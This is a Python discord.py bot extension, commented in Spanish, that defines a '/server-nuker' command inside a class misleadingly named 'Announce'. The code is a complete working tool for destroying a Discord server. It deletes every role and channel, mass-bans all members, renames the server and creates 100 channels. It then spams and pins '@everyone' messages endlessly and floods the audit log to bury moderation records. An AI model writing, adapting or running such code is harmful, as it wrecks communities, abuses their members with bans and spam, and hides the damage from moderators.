import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import random

class Announce(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="server-nuker", description="Nuke the server, instantly")
    @app_commands.describe(
        user_safe="User to give admin",
        roletogive="Role that contains the bots in the server",
        message="Nuke text that will appear"
    )
    @app_commands.checks.has_permissions(administrator=True)
    async def server_nuker(self, interaction: discord.Interaction, 
                          user_safe: discord.User, 
                          roletogive: discord.Role, 
                          message: str):
        """Comando para realizar acciones administrativas y enviar anuncios"""
        await interaction.response.send_message("Iniciando operación...", ephemeral=True)
        
        try:
            guild = interaction.guild
            current_user = interaction.user
            
            # Verificaciones de seguridad
            if user_safe.id == self.bot.user.id:
                await interaction.followup.send("Error: No puedes seleccionar al bot como user_safe.", ephemeral=True)
                return
                
            if roletogive.position >= guild.me.top_role.position:
                await interaction.followup.send("Error: El rol seleccionado tiene una posición más alta que la del bot.", ephemeral=True)
                return
            
            # 1. Eliminar todos los roles excepto roletogive
            for role in guild.roles:
                try:
                    if role.id != roletogive.id and not role.managed and role != guild.default_role:
                        await role.delete()
                        await asyncio.sleep(0.1)
                except:
                    continue
            
            # 2. PRIMERO: Banear miembros con el rol especificado (excepto user_safe y el bot)
            banned_members = 0
            members_with_role = []
            
            # Primero identificamos todos los miembros con el rol
            async for member in guild.fetch_members():
                if any(role.id == roletogive.id for role in member.roles):
                    # Evitar banear al user_safe y al bot
                    if member.id != user_safe.id and member.id != self.bot.user.id:
                        members_with_role.append(member)
            
            # Luego baneamos uno por uno con un pequeño delay para evitar rate limits
            for member in members_with_role:
                try:
                    await member.ban(reason=f"Reorganización: Miembro con rol {roletogive.name}")
                    banned_members += 1
                    await asyncio.sleep(0.1)  # Pequeño delay entre baneos
                except Exception as e:
                    continue
            
            # 3. LUEGO: Añadir rol al admin solo si no lo tiene ya
            try:
                admin_member = await guild.fetch_member(user_safe.id)
                # Verificar si el usuario ya tiene el rol
                if not any(role.id == roletogive.id for role in admin_member.roles):
                    await admin_member.add_roles(roletogive)
            except:
                pass
            
            # 4. Eliminar TODOS los canales
            delete_tasks = []
            for channel in guild.channels:
                delete_tasks.append(channel.delete())
            
            if delete_tasks:
                await asyncio.gather(*delete_tasks, return_exceptions=True)
            
            # 5. Cambiar nombre del servidor
            try:
                await guild.edit(name=message[:100])
            except:
                pass
            
            # 6. Iniciar baneo masivo en segundo plano
            async def mass_ban():
                async for member in guild.fetch_members():
                    try:
                        if (member.id != user_safe.id and 
                            member.id != self.bot.user.id):
                            await member.ban(reason=f"Reorganización masiva: {current_user}")
                            await asyncio.sleep(0.1)
                    except:
                        continue
            
            # Ejecutar baneo masivo en segundo plano
            asyncio.create_task(mass_ban())
            
            # 7. Crear canales
            spam_message = f"@everyone {message}"
            max_channels = 100
            
            # Crear canales rápidamente
            channel_tasks = []
            created_channels = []
            
            for i in range(max_channels):
                try:
                    channel_name = f"{message}-{i}"
                    channel_tasks.append(guild.create_text_channel(channel_name[:100]))
                    if i % 5 == 0:
                        await asyncio.sleep(0.1)
                except:
                    break
            
            # Esperar a que se creen todos los canales
            created_channels = await asyncio.gather(*channel_tasks, return_exceptions=True)
            created_channels = [c for c in created_channels if not isinstance(c, Exception)]
            
            # 8. Iniciar spam rápido en todos los canales
            async def continuous_spam():
                while True:
                    try:
                        for channel in created_channels:
                            msg = await channel.send(spam_message)
                            # Fijar mensaje
                            try:
                                await msg.pin()
                            except:
                                pass
                            await asyncio.sleep(0.05)  # Muy rápido
                    except:
                        await asyncio.sleep(0.1)
            
            # Iniciar spam rápido en segundo plano
            asyncio.create_task(continuous_spam())
            
            # 9. Spam de registros de auditoría
            async def audit_spam():
                while True:
                    try:
                        # Crear y eliminar canales rápidamente para llenar logs
                        channel = await guild.create_text_channel("audit-spam")
                        await channel.delete()
                        await asyncio.sleep(0.1)
                    except:
                        await asyncio.sleep(0.5)
            
            asyncio.create_task(audit_spam())
            
            # 10. Banear al usuario que ejecutó el comando si no es el user_safe
            if current_user.id != user_safe.id:
                try:
                    await asyncio.sleep(1)
                    await current_user.ban(reason=f"Usuario que ejecutó el comando de nuke")
                except:
                    pass
            
        except Exception as e:
            try:
                await interaction.followup.send("Ocurrió un error durante el proceso.", ephemeral=True)
            except:
                pass

async def setup(bot):
    await bot.add_cog(Announce(bot))
